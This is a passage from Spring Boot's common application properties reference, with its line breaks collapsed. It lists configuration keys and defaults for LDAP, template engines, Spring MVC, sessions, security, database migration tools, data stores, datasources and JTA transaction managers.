of the server.spring.ldap.username= # Login username of the server.# EMBEDDED LDAP (EmbeddedLdapProperties)spring.ldap.embedded.base-dn= # List of base DNs.spring.ldap.embedded.credential.username= # Embedded LDAP username.spring.ldap.embedded.credential.password= # Embedded LDAP password.spring.ldap.embedded.ldif=classpath:schema.ldif # Schema (LDIF) script resource reference.spring.ldap.embedded.port=0 # Embedded LDAP port.spring.ldap.embedded.validation.enabled=true # Whether to enable LDAP schema validation.spring.ldap.embedded.validation.schema= # Path to the custom schema.# MUSTACHE TEMPLATES (MustacheAutoConfiguration)spring.mustache.allow-request-override=false # Whether HttpServletRequest attributes are allowed to override (hide) controller generated model attributes of the same name.spring.mustache.allow-session-override=false # Whether HttpSession attributes are allowed to override (hide) controller generated model attributes of the same name.spring.mustache.cache=false # Whether to enable template caching.spring.mustache.charset=UTF-8 # Template encoding.spring.mustache.check-template-location=true # Whether to check that the templates location exists.spring.mustache.content-type=text/html # Content-Type value.spring.mustache.enabled=true # Whether to enable MVC view resolution for this technology.spring.mustache.expose-request-attributes=false # Whether all request attributes should be added to the model prior to merging with the template.spring.mustache.expose-session-attributes=false # Whether all HttpSession attributes should be added to the model prior to merging with the template.spring.mustache.expose-spring-macro-helpers=true # Whether to expose a RequestContext for use by Spring&apos;s macro library, under the name &quot;springMacroRequestContext&quot;.spring.mustache.prefix=classpath:/templates/ # Prefix to apply to template names.spring.mustache.request-context-attribute= # Name of the RequestContext attribute for all views.spring.mustache.suffix=.mustache # Suffix to apply to template names.spring.mustache.view-names= # White list of view names that can be resolved.# SPRING MVC (WebMvcProperties)spring.mvc.async.request-timeout= # Amount of time before asynchronous request handling times out.spring.mvc.contentnegotiation.favor-parameter=false # Whether a request parameter (&quot;format&quot; by default) should be used to determine the requested media type.spring.mvc.contentnegotiation.favor-path-extension=false # Whether the path extension in the URL path should be used to determine the requested media type.spring.mvc.contentnegotiation.media-types.*= # Map file extensions to media types for content negotiation. For instance, yml to text/yaml.spring.mvc.contentnegotiation.parameter-name= # Query parameter name to use when &quot;favor-parameter&quot; is enabled.spring.mvc.date-format= # Date format to use. For instance, `dd/MM/yyyy`.spring.mvc.dispatch-trace-request=false # Whether to dispatch TRACE requests to the FrameworkServlet doService method.spring.mvc.dispatch-options-request=true # Whether to dispatch OPTIONS requests to the FrameworkServlet doService method.spring.mvc.favicon.enabled=true # Whether to enable resolution of favicon.ico.spring.mvc.formcontent.putfilter.enabled=true # Whether to enable Spring&apos;s HttpPutFormContentFilter.spring.mvc.ignore-default-model-on-redirect=true # Whether the content of the &quot;default&quot; model should be ignored during redirect scenarios.spring.mvc.locale= # Locale to use. By default, this locale is overridden by the &quot;Accept-Language&quot; header.spring.mvc.locale-resolver=accept-header # Define how the locale should be resolved.spring.mvc.log-resolved-exception=false # Whether to enable warn logging of exceptions resolved by a &quot;HandlerExceptionResolver&quot;.spring.mvc.message-codes-resolver-format= # Formatting strategy for message codes. For instance, `PREFIX_ERROR_CODE`.spring.mvc.pathmatch.use-registered-suffix-pattern=false # Whether suffix pattern matching should work only against extensions registered with &quot;spring.mvc.contentnegotiation.media-types.*&quot;.spring.mvc.pathmatch.use-suffix-pattern=false # Whether to use suffix pattern match (&quot;.*&quot;) when matching patterns to requests.spring.mvc.servlet.load-on-startup=-1 # Load on startup priority of the dispatcher servlet.spring.mvc.static-path-pattern=/** # Path pattern used for static resources.spring.mvc.throw-exception-if-no-handler-found=false # Whether a &quot;NoHandlerFoundException&quot; should be thrown if no Handler was found to process a request.spring.mvc.view.prefix= # Spring MVC view prefix.spring.mvc.view.suffix= # Spring MVC view suffix.# SPRING RESOURCES HANDLING (ResourceProperties)spring.resources.add-mappings=true # Whether to enable default resource handling.spring.resources.cache.cachecontrol.cache-private= # Indicate that the response message is intended for a single user and must not be stored by a shared cache.spring.resources.cache.cachecontrol.cache-public= # Indicate that any cache may store the response.spring.resources.cache.cachecontrol.max-age= # Maximum time the response should be cached, in seconds if no duration suffix is not specified.spring.resources.cache.cachecontrol.must-revalidate= # Indicate that once it has become stale, a cache must not use the response without re-validating it with the server.spring.resources.cache.cachecontrol.no-cache= # Indicate that the cached response can be reused only if re-validated with the server.spring.resources.cache.cachecontrol.no-store= # Indicate to not cache the response in any case.spring.resources.cache.cachecontrol.no-transform= # Indicate intermediaries (caches and others) that they should not transform the response content.spring.resources.cache.cachecontrol.proxy-revalidate= # Same meaning as the &quot;must-revalidate&quot; directive, except that it does not apply to private caches.spring.resources.cache.cachecontrol.s-max-age= # Maximum time the response should be cached by shared caches, in seconds if no duration suffix is not specified.spring.resources.cache.cachecontrol.stale-if-error= # Maximum time the response may be used when errors are encountered, in seconds if no duration suffix is not specified.spring.resources.cache.cachecontrol.stale-while-revalidate= # Maximum time the response can be served after it becomes stale, in seconds if no duration suffix is not specified.spring.resources.cache.period= # Cache period for the resources served by the resource handler. If a duration suffix is not specified, seconds will be used.spring.resources.chain.cache=true # Whether to enable caching in the Resource chain.spring.resources.chain.enabled= # Whether to enable the Spring Resource Handling chain. By default, disabled unless at least one strategy has been enabled.spring.resources.chain.gzipped=false # Whether to enable resolution of already gzipped resources.spring.resources.chain.html-application-cache=false # Whether to enable HTML5 application cache manifest rewriting.spring.resources.chain.strategy.content.enabled=false # Whether to enable the content Version Strategy.spring.resources.chain.strategy.content.paths=/** # Comma-separated list of patterns to apply to the content Version Strategy.spring.resources.chain.strategy.fixed.enabled=false # Whether to enable the fixed Version Strategy.spring.resources.chain.strategy.fixed.paths=/** # Comma-separated list of patterns to apply to the fixed Version Strategy.spring.resources.chain.strategy.fixed.version= # Version string to use for the fixed Version Strategy.spring.resources.static-locations=classpath:/META-INF/resources/,classpath:/resources/,classpath:/static/,classpath:/public/ # Locations of static resources.# SPRING SESSION (SessionProperties)spring.session.store-type= # Session store type.spring.session.servlet.filter-order=-2147483598 # Session repository filter order.spring.session.servlet.filter-dispatcher-types=async,error,request # Session repository filter dispatcher types.# SPRING SESSION HAZELCAST (HazelcastSessionProperties)spring.session.hazelcast.flush-mode=on-save # Sessions flush mode.spring.session.hazelcast.map-name=spring:session:sessions # Name of the map used to store sessions.# SPRING SESSION JDBC (JdbcSessionProperties)spring.session.jdbc.cleanup-cron=0 * * * * * # Cron expression for expired session cleanup job.spring.session.jdbc.initialize-schema=embedded # Database schema initialization mode.spring.session.jdbc.schema=classpath:org/springframework/session/jdbc/schema-@@platform@@.sql # Path to the SQL file to use to initialize the database schema.spring.session.jdbc.table-name=SPRING_SESSION # Name of the database table used to store sessions.# SPRING SESSION MONGODB (MongoSessionProperties)spring.session.mongodb.collection-name=sessions # Collection name used to store sessions.# SPRING SESSION REDIS (RedisSessionProperties)spring.session.redis.cleanup-cron=0 * * * * * # Cron expression for expired session cleanup job.spring.session.redis.flush-mode=on-save # Sessions flush mode.spring.session.redis.namespace=spring:session # Namespace for keys used to store sessions.# THYMELEAF (ThymeleafAutoConfiguration)spring.thymeleaf.cache=true # Whether to enable template caching.spring.thymeleaf.check-template=true # Whether to check that the template exists before rendering it.spring.thymeleaf.check-template-location=true # Whether to check that the templates location exists.spring.thymeleaf.enabled=true # Whether to enable Thymeleaf view resolution for Web frameworks.spring.thymeleaf.enable-spring-el-compiler=false # Enable the SpringEL compiler in SpringEL expressions.spring.thymeleaf.encoding=UTF-8 # Template files encoding.spring.thymeleaf.excluded-view-names= # Comma-separated list of view names (patterns allowed) that should be excluded from resolution.spring.thymeleaf.mode=HTML # Template mode to be applied to templates. See also Thymeleaf&apos;s TemplateMode enum.spring.thymeleaf.prefix=classpath:/templates/ # Prefix that gets prepended to view names when building a URL.spring.thymeleaf.reactive.chunked-mode-view-names= # Comma-separated list of view names (patterns allowed) that should be the only ones executed in CHUNKED mode when a max chunk size is set.spring.thymeleaf.reactive.full-mode-view-names= # Comma-separated list of view names (patterns allowed) that should be executed in FULL mode even if a max chunk size is set.spring.thymeleaf.reactive.max-chunk-size=0 # Maximum size of data buffers used for writing to the response, in bytes.spring.thymeleaf.reactive.media-types= # Media types supported by the view technology.spring.thymeleaf.servlet.content-type=text/html # Content-Type value written to HTTP responses.spring.thymeleaf.suffix=.html # Suffix that gets appended to view names when building a URL.spring.thymeleaf.template-resolver-order= # Order of the template resolver in the chain.spring.thymeleaf.view-names= # Comma-separated list of view names (patterns allowed) that can be resolved.# SPRING WEBFLUX (WebFluxProperties)spring.webflux.date-format= # Date format to use. For instance, `dd/MM/yyyy`.spring.webflux.static-path-pattern=/** # Path pattern used for static resources.# SPRING WEB SERVICES (WebServicesProperties)spring.webservices.path=/services # Path that serves as the base URI for the services.spring.webservices.servlet.init= # Servlet init parameters to pass to Spring Web Services.spring.webservices.servlet.load-on-startup=-1 # Load on startup priority of the Spring Web Services servlet.spring.webservices.wsdl-locations= # Comma-separated list of locations of WSDLs and accompanying XSDs to be exposed as beans.# ----------------------------------------# SECURITY PROPERTIES# ----------------------------------------# SECURITY (SecurityProperties)spring.security.filter.order=-100 # Security filter chain order.spring.security.filter.dispatcher-types=async,error,request # Security filter chain dispatcher types.spring.security.user.name=user # Default user name.spring.security.user.password= # Password for the default user name.spring.security.user.roles= # Granted roles for the default user name.# SECURITY OAUTH2 CLIENT (OAuth2ClientProperties)spring.security.oauth2.client.provider.*= # OAuth provider details.spring.security.oauth2.client.registration.*= # OAuth client registrations.# ----------------------------------------# DATA PROPERTIES# ----------------------------------------# FLYWAY (FlywayProperties)spring.flyway.baseline-description= #spring.flyway.baseline-on-migrate= #spring.flyway.baseline-version=1 # Version to start migrationspring.flyway.check-location=true # Whether to check that migration scripts location exists.spring.flyway.clean-disabled= #spring.flyway.clean-on-validation-error= #spring.flyway.dry-run-output= #spring.flyway.enabled=true # Whether to enable flyway.spring.flyway.encoding= #spring.flyway.error-handlers= #spring.flyway.group= #spring.flyway.ignore-future-migrations= #spring.flyway.ignore-missing-migrations= #spring.flyway.init-sqls= # SQL statements to execute to initialize a connection immediately after obtaining it.spring.flyway.installed-by= #spring.flyway.locations=classpath:db/migration # The locations of migrations scripts.spring.flyway.mixed= #spring.flyway.out-of-order= #spring.flyway.password= # JDBC password to use if you want Flyway to create its own DataSource.spring.flyway.placeholder-prefix= #spring.flyway.placeholder-replacement= #spring.flyway.placeholder-suffix= #spring.flyway.placeholders.*= #spring.flyway.repeatable-sql-migration-prefix= #spring.flyway.schemas= # schemas to updatespring.flyway.skip-default-callbacks= #spring.flyway.skip-default-resolvers= #spring.flyway.sql-migration-prefix=V #spring.flyway.sql-migration-separator= #spring.flyway.sql-migration-suffix=.sql #spring.flyway.sql-migration-suffixes= #spring.flyway.table= #spring.flyway.target= #spring.flyway.undo-sql-migration-prefix= #spring.flyway.url= # JDBC url of the database to migrate. If not set, the primary configured data source is used.spring.flyway.user= # Login user of the database to migrate.spring.flyway.validate-on-migrate= ## LIQUIBASE (LiquibaseProperties)spring.liquibase.change-log=classpath:/db/changelog/db.changelog-master.yaml # Change log configuration path.spring.liquibase.check-change-log-location=true # Whether to check that the change log location exists.spring.liquibase.contexts= # Comma-separated list of runtime contexts to use.spring.liquibase.default-schema= # Default database schema.spring.liquibase.drop-first=false # Whether to first drop the database schema.spring.liquibase.enabled=true # Whether to enable Liquibase support.spring.liquibase.labels= # Comma-separated list of runtime labels to use.spring.liquibase.parameters.*= # Change log parameters.spring.liquibase.password= # Login password of the database to migrate.spring.liquibase.rollback-file= # File to which rollback SQL is written when an update is performed.spring.liquibase.url= # JDBC URL of the database to migrate. If not set, the primary configured data source is used.spring.liquibase.user= # Login user of the database to migrate.# COUCHBASE (CouchbaseProperties)spring.couchbase.bootstrap-hosts= # Couchbase nodes (host or IP address) to bootstrap from.spring.couchbase.bucket.name=default # Name of the bucket to connect to.spring.couchbase.bucket.password= # Password of the bucket.spring.couchbase.env.endpoints.key-value=1 # Number of sockets per node against the key/value service.spring.couchbase.env.endpoints.query=1 # Number of sockets per node against the query (N1QL) service.spring.couchbase.env.endpoints.view=1 # Number of sockets per node against the view service.spring.couchbase.env.ssl.enabled= # Whether to enable SSL support. Enabled automatically if a &quot;keyStore&quot; is provided unless specified otherwise.spring.couchbase.env.ssl.key-store= # Path to the JVM key store that holds the certificates.spring.couchbase.env.ssl.key-store-password= # Password used to access the key store.spring.couchbase.env.timeouts.connect=5000ms # Bucket connections timeouts.spring.couchbase.env.timeouts.key-value=2500ms # Blocking operations performed on a specific key timeout.spring.couchbase.env.timeouts.query=7500ms # N1QL query operations timeout.spring.couchbase.env.timeouts.socket-connect=1000ms # Socket connect connections timeout.spring.couchbase.env.timeouts.view=7500ms # Regular and geospatial view operations timeout.# DAO (PersistenceExceptionTranslationAutoConfiguration)spring.dao.exceptiontranslation.enabled=true # Whether to enable the PersistenceExceptionTranslationPostProcessor.# CASSANDRA (CassandraProperties)spring.data.cassandra.cluster-name= # Name of the Cassandra cluster.spring.data.cassandra.compression=none # Compression supported by the Cassandra binary protocol.spring.data.cassandra.connect-timeout= # Socket option: connection time out.spring.data.cassandra.consistency-level= # Queries consistency level.spring.data.cassandra.contact-points=localhost # Cluster node addresses.spring.data.cassandra.fetch-size= # Queries default fetch size.spring.data.cassandra.keyspace-name= # Keyspace name to use.spring.data.cassandra.load-balancing-policy= # Class name of the load balancing policy.spring.data.cassandra.port= # Port of the Cassandra server.spring.data.cassandra.password= # Login password of the server.spring.data.cassandra.pool.heartbeat-interval=30s # Heartbeat interval after which a message is sent on an idle connection to make sure it&apos;s still alive. If a duration suffix is not specified, seconds will be used.spring.data.cassandra.pool.idle-timeout=120s # Idle timeout before an idle connection is removed. If a duration suffix is not specified, seconds will be used.spring.data.cassandra.pool.max-queue-size=256 # Maximum number of requests that get queued if no connection is available.spring.data.cassandra.pool.pool-timeout=5000ms # Pool timeout when trying to acquire a connection from a host&apos;s pool.spring.data.cassandra.read-timeout= # Socket option: read time out.spring.data.cassandra.reconnection-policy= # Reconnection policy class.spring.data.cassandra.repositories.type=auto # Type of Cassandra repositories to enable.spring.data.cassandra.retry-policy= # Class name of the retry policy.spring.data.cassandra.serial-consistency-level= # Queries serial consistency level.spring.data.cassandra.schema-action=none # Schema action to take at startup.spring.data.cassandra.ssl=false # Enable SSL support.spring.data.cassandra.username= # Login user of the server.# DATA COUCHBASE (CouchbaseDataProperties)spring.data.couchbase.auto-index=false # Automatically create views and indexes.spring.data.couchbase.consistency=read-your-own-writes # Consistency to apply by default on generated queries.spring.data.couchbase.repositories.type=auto # Type of Couchbase repositories to enable.# ELASTICSEARCH (ElasticsearchProperties)spring.data.elasticsearch.cluster-name=elasticsearch # Elasticsearch cluster name.spring.data.elasticsearch.cluster-nodes= # Comma-separated list of cluster node addresses.spring.data.elasticsearch.properties.*= # Additional properties used to configure the client.spring.data.elasticsearch.repositories.enabled=true # Whether to enable Elasticsearch repositories.# DATA LDAPspring.data.ldap.repositories.enabled=true # Whether to enable LDAP repositories.# MONGODB (MongoProperties)spring.data.mongodb.authentication-database= # Authentication database name.spring.data.mongodb.database= # Database name.spring.data.mongodb.field-naming-strategy= # Fully qualified name of the FieldNamingStrategy to use.spring.data.mongodb.grid-fs-database= # GridFS database name.spring.data.mongodb.host= # Mongo server host. Cannot be set with URI.spring.data.mongodb.password= # Login password of the mongo server. Cannot be set with URI.spring.data.mongodb.port= # Mongo server port. Cannot be set with URI.spring.data.mongodb.repositories.type=auto # Type of Mongo repositories to enable.spring.data.mongodb.uri=mongodb://localhost/test # Mongo database URI. Cannot be set with host, port and credentials.spring.data.mongodb.username= # Login user of the mongo server. Cannot be set with URI.# DATA REDISspring.data.redis.repositories.enabled=true # Whether to enable Redis repositories.# NEO4J (Neo4jProperties)spring.data.neo4j.auto-index=none # Auto index mode.spring.data.neo4j.embedded.enabled=true # Whether to enable embedded mode if the embedded driver is available.spring.data.neo4j.open-in-view=true # Register OpenSessionInViewInterceptor. Binds a Neo4j Session to the thread for the entire processing of the request.spring.data.neo4j.password= # Login password of the server.spring.data.neo4j.repositories.enabled=true # Whether to enable Neo4j repositories.spring.data.neo4j.uri= # URI used by the driver. Auto-detected by default.spring.data.neo4j.username= # Login user of the server.# DATA REST (RepositoryRestProperties)spring.data.rest.base-path= # Base path to be used by Spring Data REST to expose repository resources.spring.data.rest.default-media-type= # Content type to use as a default when none is specified.spring.data.rest.default-page-size= # Default size of pages.spring.data.rest.detection-strategy=default # Strategy to use to determine which repositories get exposed.spring.data.rest.enable-enum-translation= # Whether to enable enum value translation through the Spring Data REST default resource bundle.spring.data.rest.limit-param-name= # Name of the URL query string parameter that indicates how many results to return at once.spring.data.rest.max-page-size= # Maximum size of pages.spring.data.rest.page-param-name= # Name of the URL query string parameter that indicates what page to return.spring.data.rest.return-body-on-create= # Whether to return a response body after creating an entity.spring.data.rest.return-body-on-update= # Whether to return a response body after updating an entity.spring.data.rest.sort-param-name= # Name of the URL query string parameter that indicates what direction to sort results.# SOLR (SolrProperties)spring.data.solr.host=http://127.0.0.1:8983/solr # Solr host. Ignored if &quot;zk-host&quot; is set.spring.data.solr.repositories.enabled=true # Whether to enable Solr repositories.spring.data.solr.zk-host= # ZooKeeper host address in the form HOST:PORT.# DATA WEB (SpringDataWebProperties)spring.data.web.pageable.default-page-size=20 # Default page size.spring.data.web.pageable.max-page-size=2000 # Maximum page size to be accepted.spring.data.web.pageable.one-indexed-parameters=false # Whether to expose and assume 1-based page number indexes.spring.data.web.pageable.page-parameter=page # Page index parameter name.spring.data.web.pageable.prefix= # General prefix to be prepended to the page number and page size parameters.spring.data.web.pageable.qualifier-delimiter=_ # Delimiter to be used between the qualifier and the actual page number and size properties.spring.data.web.pageable.size-parameter=size # Page size parameter name.spring.data.web.sort.sort-parameter=sort # Sort parameter name.# DATASOURCE (DataSourceAutoConfiguration &amp; DataSourceProperties)spring.datasource.continue-on-error=false # Whether to stop if an error occurs while initializing the database.spring.datasource.data= # Data (DML) script resource references.spring.datasource.data-username= # Username of the database to execute DML scripts (if different).spring.datasource.data-password= # Password of the database to execute DML scripts (if different).spring.datasource.dbcp2.*= # Commons DBCP2 specific settingsspring.datasource.driver-class-name= # Fully qualified name of the JDBC driver. Auto-detected based on the URL by default.spring.datasource.generate-unique-name=false # Whether to generate a random datasource name.spring.datasource.hikari.*= # Hikari specific settingsspring.datasource.initialization-mode=embedded # Initialize the datasource with available DDL and DML scripts.spring.datasource.jmx-enabled=false # Whether to enable JMX support (if provided by the underlying pool).spring.datasource.jndi-name= # JNDI location of the datasource. Class, url, username &amp; password are ignored when set.spring.datasource.name= # Name of the datasource. Default to &quot;testdb&quot; when using an embedded database.spring.datasource.password= # Login password of the database.spring.datasource.platform=all # Platform to use in the DDL or DML scripts (such as schema-$&#123;platform&#125;.sql or data-$&#123;platform&#125;.sql).spring.datasource.schema= # Schema (DDL) script resource references.spring.datasource.schema-username= # Username of the database to execute DDL scripts (if different).spring.datasource.schema-password= # Password of the database to execute DDL scripts (if different).spring.datasource.separator=; # Statement separator in SQL initialization scripts.spring.datasource.sql-script-encoding= # SQL scripts encoding.spring.datasource.tomcat.*= # Tomcat datasource specific settingsspring.datasource.type= # Fully qualified name of the connection pool implementation to use. By default, it is auto-detected from the classpath.spring.datasource.url= # JDBC URL of the database.spring.datasource.username= # Login username of the database.spring.datasource.xa.data-source-class-name= # XA datasource fully qualified name.spring.datasource.xa.properties= # Properties to pass to the XA data source.# JEST (Elasticsearch HTTP client) (JestProperties)spring.elasticsearch.jest.connection-timeout=3s # Connection timeout.spring.elasticsearch.jest.multi-threaded=true # Whether to enable connection requests from multiple execution threads.spring.elasticsearch.jest.password= # Login password.spring.elasticsearch.jest.proxy.host= # Proxy host the HTTP client should use.spring.elasticsearch.jest.proxy.port= # Proxy port the HTTP client should use.spring.elasticsearch.jest.read-timeout=3s # Read timeout.spring.elasticsearch.jest.uris=http://localhost:9200 # Comma-separated list of the Elasticsearch instances to use.spring.elasticsearch.jest.username= # Login username.# H2 Web Console (H2ConsoleProperties)spring.h2.console.enabled=false # Whether to enable the console.spring.h2.console.path=/h2-console # Path at which the console is available.spring.h2.console.settings.trace=false # Whether to enable trace output.spring.h2.console.settings.web-allow-others=false # Whether to enable remote access.# InfluxDB (InfluxDbProperties)spring.influx.password= # Login password.spring.influx.url= # URL of the InfluxDB instance to which to connect.spring.influx.user= # Login user.# JOOQ (JooqProperties)spring.jooq.sql-dialect= # SQL dialect to use. Auto-detected by default.# JDBC (JdbcProperties)spring.jdbc.template.fetch-size=-1 # Number of rows that should be fetched from the database when more rows are needed.spring.jdbc.template.max-rows=-1 # Maximum number of rows.spring.jdbc.template.query-timeout= # Query timeout. Default is to use the JDBC driver&apos;s default configuration. If a duration suffix is not specified, seconds will be used.# JPA (JpaBaseConfiguration, HibernateJpaAutoConfiguration)spring.data.jpa.repositories.enabled=true # Whether to enable JPA repositories.spring.jpa.database= # Target database to operate on, auto-detected by default. Can be alternatively set using the &quot;databasePlatform&quot; property.spring.jpa.database-platform= # Name of the target database to operate on, auto-detected by default. Can be alternatively set using the &quot;Database&quot; enum.spring.jpa.generate-ddl=false # Whether to initialize the schema on startup.spring.jpa.hibernate.ddl-auto= # DDL mode. This is actually a shortcut for the &quot;hibernate.hbm2ddl.auto&quot; property. Defaults to &quot;create-drop&quot; when using an embedded database and no schema manager was detected. Otherwise, defaults to &quot;none&quot;.spring.jpa.hibernate.naming.implicit-strategy= # Fully qualified name of the implicit naming strategy.spring.jpa.hibernate.naming.physical-strategy= # Fully qualified name of the physical naming strategy.spring.jpa.hibernate.use-new-id-generator-mappings= # Whether to use Hibernate&apos;s newer IdentifierGenerator for AUTO, TABLE and SEQUENCE.spring.jpa.mapping-resources= # Mapping resources (equivalent to &quot;mapping-file&quot; entries in persistence.xml).spring.jpa.open-in-view=true # Register OpenEntityManagerInViewInterceptor. Binds a JPA EntityManager to the thread for the entire processing of the request.spring.jpa.properties.*= # Additional native properties to set on the JPA provider.spring.jpa.show-sql=false # Whether to enable logging of SQL statements.# JTA (JtaAutoConfiguration)spring.jta.enabled=true # Whether to enable JTA support.spring.jta.log-dir= # Transaction logs directory.spring.jta.transaction-manager-id= # Transaction manager unique identifier.# ATOMIKOS (AtomikosProperties)spring.jta.atomikos.connectionfactory.borrow-connection-timeout=30 # Timeout, in seconds, for borrowing connections from the pool.spring.jta.atomikos.connectionfactory.ignore-session-transacted-flag=true # Whether to ignore the transacted flag when creating session.spring.jta.atomikos.connectionfactory.local-transaction-mode=false # Whether local transactions are desired.spring.jta.atomikos.connectionfactory.maintenance-interval=60 # The time, in seconds, between runs of the pool&apos;s maintenance thread.spring.jta.atomikos.connectionfactory.max-idle-time=60 # The time, in seconds, after which connections are cleaned up from the pool.spring.jta.atomikos.connectionfactory.max-lifetime=0 # The time, in seconds, that a connection can be pooled for before being destroyed. 0 denotes no limit.spring.jta.atomikos.connectionfactory.max-pool-size=1 # The maximum size of the pool.spring.jta.atomikos.connectionfactory.min-pool-size=1 # The minimum size of the pool.spring.jta.atomikos.connectionfactory.reap-timeout=0 # The reap timeout, in seconds, for borrowed connections. 0 denotes no limit.spring.jta.atomikos.connectionfactory.unique-resource-name=jmsConnectionFactory # The unique name used to identify the resource during recovery.spring.jta.atomikos.connectionfactory.xa-connection-factory-class-name= # Vendor-specific implementation of XAConnectionFactory.spring.jta.atomikos.connectionfactory.xa-properties= # Vendor-specific XA properties.spring.jta.atomikos.datasource.borrow-connection-timeout=30 # Timeout, in seconds, for borrowing connections from the pool.spring.jta.atomikos.datasource.concurrent-connection-validation= # Whether to use concurrent connection validation.spring.jta.atomikos.datasource.default-isolation-level= # Default isolation level of connections provided by the pool.spring.jta.atomikos.datasource.login-timeout= # Timeout, in seconds, for establishing a database connection.spring.jta.atomikos.datasource.maintenance-interval=60 # The time, in seconds, between runs of the pool&apos;s maintenance thread.spring.jta.atomikos.datasource.max-idle-time=60 # The time, in seconds, after which connections are cleaned up from the pool.spring.jta.atomikos.datasource.max-lifetime=0 # The time, in seconds, that a connection can be pooled for before being destroyed. 0 denotes no limit.spring.jta.atomikos.datasource.max-pool-size=1 # The maximum size of the pool.spring.jta.atomikos.datasource.min-pool-size=1 # The minimum size of the pool.spring.jta.atomikos.datasource.reap-timeout=0 # The reap timeout, in seconds, for borrowed connections. 0 denotes no limit.spring.jta.atomikos.datasource.test-query= # SQL query or statement used to validate a connection before returning it.spring.jta.atomikos.datasource.unique-resource-name=dataSource # The unique name used to identify the resource during recovery.spring.jta.atomikos.datasource.xa-data-source-class-name= # Vendor-specific implementation of XAConnectionFactory.spring.jta.atomikos.datasource.xa-properties= # Vendor-specific XA properties.spring.jta.atomikos.properties.allow-sub-transactions=true # Specify whether sub-transactions are allowed.spring.jta.atomikos.properties.checkpoint-interval=500 # Interval between checkpoints, expressed as the number of log writes between two checkpoint.spring.jta.atomikos.properties.default-jta-timeout=10000ms # Default timeout for JTA transactions.spring.jta.atomikos.properties.default-max-wait-time-on-shutdown=9223372036854775807 # How long should normal shutdown (no-force) wait for transactions to complete.spring.jta.atomikos.properties.enable-logging=true # Whether to enable disk logging.spring.jta.atomikos.properties.force-shutdown-on-vm-exit=false # Whether a VM shutdown should trigger forced shutdown of the transaction core.spring.jta.atomikos.properties.log-base-dir= # Directory in which the log files should be stored.spring.jta.atomikos.properties.log-base-name=tmlog # Transactions log file base name.spring.jta.atomikos.properties.max-actives=50 # Maximum number of active transactions.spring.jta.atomikos.properties.max-timeout=300000ms # Maximum timeout that can be allowed for transactions.spring.jta.atomikos.properties.recovery.delay=10000ms # Delay between two recovery scans.spring.jta.atomikos.properties.recovery.forget-orphaned-log-entries-delay=86400000ms # Delay after which recovery can cleanup pending (&apos;orphaned&apos;) log entries.spring.jta.atomikos.properties.recovery.max-retries=5 # Number of retry attempts to commit the transaction before throwing an exception.spring.jta.atomikos.properties.recovery.retry-interval=10000ms # Delay between retry attempts.spring.jta.atomikos.properties.serial-jta-transactions=true # Whether sub-transactions should be joined when possible.spring.jta.atomikos.properties.service= # Transaction manager implementation that should be started.spring.jta.atomikos.properties.threaded-two-phase-commit=false # Whether to use different (and concurrent) threads for two-phase commit on the participating resources.spring.jta.atomikos.properties.transaction-manager-unique-name= # The transaction manager&apos;s unique name.# BITRONIXspring.jta.bitronix.connectionfactory.acquire-increment=1 # Number of connections to create when growing the pool.spring.jta.bitronix.connectionfactory.acquisition-interval=1 # Time, in seconds, to wait before trying to acquire a connection again after an invalid connection was acquired.spring.jta.bitronix.connectionfactory.acquisition-timeout=30 # Timeout, in seconds, for acquiring connections from the pool.spring.jta.bitronix.connectionfactory.allow-local-transactions=true # Whether the transaction manager should allow mixing XA and non-XA transactions.spring.jta.bitronix.connectionfactory.apply-transaction-timeout=false # Whether the transaction timeout should be set on the XAResource when it is enlisted.spring.jta.bitronix.connectionfactory.automatic-enlisting-enabled=true # Whether resources should be enlisted and delisted automatically.spring.jta.bitronix.connectionfactory.cache-producers-consumers=true # Whether producers and consumers should be cached.spring.jta.bitronix.connectionfactory.class-name= # Underlying implementation class name of the XA resource.spring.jta.bitronix.connectionfactory.defer-connection-release=true # Whether the provider can run many transactions on the same connection and supports transaction interleaving.spring.jta.bitronix.connectionfactory.disabled= # Whether this resource is disabled, meaning it&apos;s temporarily forbidden to acquire a connection from its pool.spring.jta.bitronix.connectionfactory.driver-properties= # Properties that should be set on the underlying implementation.spring.jta.bitronix.connectionfactory.failed= # Mark this resource producer as failed.spring.jta.bitronix.connectionfactory.ignore-recovery-failures=false # Whether recovery failures should be ignored.spring.jta.bitronix.connectionfactory.max-idle-time=60 # The time, in seconds, after which connections are cleaned up from the pool.spring.jta.bitronix.connectionfactory.max-pool-size=10 # The maximum size of the pool. 0 denotes no limit.spring.jta.bitronix.connectionfactory.min-pool-size=0 # The minimum size of the pool.spring.jta.bitronix.connectionfactory.password= # The password to use to connect to the JMS provider.spring.jta.bitronix.connectionfactory.share-transaction-connections=false # Whether connections in the ACCESSIBLE state can be shared within the context of a transaction.spring.jta.bitronix.connectionfactory.test-connections=true # Whether connections should be tested when acquired from the pool.spring.jta.bitronix.connectionfactory.two-pc-ordering-position=1 # The position that this resource should take during two-phase commit (always first is Integer.MIN_VALUE, always last is Integer.MAX_VALUE).spring.jta.bitronix.connectionfactory.unique-name=jmsConnectionFactory # The unique name used to identify the resource during recovery.spring.jta.bitronix.connectionfactory.use-tm-join=true # Whether TMJOIN should be used when starting XAResources.spring.jta.bitronix.connectionfactory.user= # The user to use to connect to the JMS provider.spring.jta.bitronix.datasource.acquire-increment=1 # Number of connections to create when growing the pool.spring.jta.bitronix.datasource.acquisition-interval=1 # Time, in seconds, to wait before trying to acquire a connection again after an invalid connection was acquired.spring.jta.bitronix.datasource.acquisition-timeout=30 # Timeout, in seconds, for acquiring connections from the pool.spring.jta.bitronix.datasource.allow-local-transactions=true # Whether the transaction manager should allow mixing XA and non-XA transactions.spring.jta.bitronix.datasource.apply-transaction-timeout=false # Whether the transaction timeout should be set on the XAResource when it is enlisted.spring.jta.bitronix.datasource.automatic-enlisting-enabled=true # Whether resources should be enlisted and delisted automatically.spring.jta.bitronix.datasource.class-name= # Underlying implementation class name of the XA resource.spring.jta.bitronix.datasource.cursor-holdability= # The default cursor holdability for connections.spring.jta.bitronix.datasource.defer-connection-release=true # Whether the database can run many transactions on the same connection and supports transaction interleaving.spring.jta.bitronix.datasource.disabled= # Whether this resource is disabled, meaning it&apos;s temporarily forbidden to acquire a connection from its pool.spring.jta.bitronix.datasource.driver-properties= # Properties that should be set on the underlying implementation.spring.jta.bitronix.datasource.enable-jdbc4-connection-test= # Whether Connection.isValid() is called when acquiring a connection from the pool.spring.jta.bitronix.datasource.failed= # Mark this resource producer as failed.spring.jta.bitronix.datasource.ignore-recovery-failures=false # Whether recovery failures should be ignored.spring.jta.bitronix.datasource.isolation-level= # The default isolation level for 